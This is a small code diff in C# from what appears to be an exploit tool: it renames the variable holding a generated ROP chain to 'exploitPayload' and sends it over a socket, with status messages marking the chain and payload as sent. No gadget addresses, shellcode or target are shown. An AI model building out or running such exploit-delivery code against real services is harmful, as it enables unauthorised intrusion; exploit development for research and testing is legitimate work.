@@ -291,9 +291,9 @@ namespace dSocket
 
 
 
-            // make rop object, build chain, add to payload
+            // make rop object, build chain, create exploit payload
             Rop myRop = new Rop(ropOffset);
-            myPayload=MakeROPChain(myRop, myPayload);
+            byte[] exploitPayload=MakeROPChain(myRop, myPayload);
             Console.WriteLine("[+] ROP chain generated");
 
 
@@ -311,7 +311,7 @@ namespace dSocket
 
 
             // send it
-            mySocket.Send(myPayload);
+            mySocket.Send(exploitPayload);
             Console.Write("[+] Payload sent");
 
 
